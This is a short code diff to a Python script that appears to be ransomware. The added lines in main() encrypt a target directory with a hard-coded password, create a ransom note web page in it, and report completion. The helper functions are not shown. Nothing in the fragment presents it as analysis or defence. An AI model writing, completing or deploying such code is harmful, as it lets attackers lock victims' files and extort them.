@@ -110,4 +110,14 @@ def main():
     else: 
         print("Unsupported OS")
         return
-                                                                                    
+    
+    # Encrypt the target directory
+    if os.path.isdir(target):
+        encrypt_directory(target, PASSWORD)
+        create_ransom_note_webpage(target)
+        print(f"Encryption complete. Ransom note created in: {target}")
+    else:
+        print(f"Target directory does not exist: {target}")
+
+if __name__ == "__main__":
+    main()                                           
